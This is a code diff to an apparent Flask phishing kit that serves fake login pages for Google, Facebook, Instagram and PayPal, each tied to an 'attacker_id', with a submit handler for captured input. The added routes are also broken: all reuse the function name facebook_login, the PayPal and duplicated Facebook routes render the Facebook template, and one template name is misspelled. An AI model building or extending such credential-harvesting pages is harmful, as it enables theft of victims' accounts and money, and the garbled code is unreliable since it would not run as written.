@@ -23,6 +23,22 @@ def google_login(attacker_id):
 def facebook_login(attacker_id):
     return render_template('facebook.html', attacker_id=attacker_id)
 
+@app.route('/instagram-login/<attacker_id>')
+def facebook_login(attacker_id):
+    return render_template('instgram.html', attacker_id=attacker_id)
+
+@app.route('/paypal-login/<attacker_id>')
+def facebook_login(attacker_id):
+    return render_template('facebook.html', attacker_id=attacker_id)
+
+@app.route('/facebook-login/<attacker_id>')
+def facebook_login(attacker_id):
+    return render_template('facebook.html', attacker_id=attacker_id)
+
+@app.route('/facebook-login/<attacker_id>')
+def facebook_login(attacker_id):
+    return render_template('facebook.html', attacker_id=attacker_id)
+
 
 @app.route('/submit', methods=['POST'])
 def submit():
